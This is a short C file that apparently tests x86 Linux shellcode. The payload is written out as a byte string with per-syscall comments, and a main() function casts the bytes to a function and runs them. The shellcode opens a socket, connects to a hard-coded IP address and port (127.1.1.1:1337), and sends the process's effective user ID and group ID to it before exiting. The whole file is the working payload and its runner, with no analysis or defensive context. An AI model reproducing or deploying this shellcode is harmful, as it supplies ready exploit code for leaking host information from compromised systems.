#include<stdio.h>
#include<string.h>

#define IP "\x7f\x01\x01\x01"
#define PORT "\x05\x39"

const char code[] =\
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6"//socket()
"\xb0\x66\x43\x68"IP"\x66\x68"PORT"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80"//connect()
"\x6a\x31\x58\xcd\x80\x86\xe0\xc1\xc0\x10\x86\xe0\x97\xeb\x0f"//geteuid()
"\x6a\x2f\x58\xcd\x80\x86\xe0\xc1\xc0\x10\x86\xe0\x97\xeb\x14"//getgid()
"\x6a\x66\x58\x6a\x09\x5b\x57\x89\xe1\x52\x6a\x04\x51\x56\x89\xe1\xcd\x80\xeb\xdd"//send()
"\x31\xc0\x31\xdb\x40\xcd\x80";//exit(0) length 105

main()
{
    printf("Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
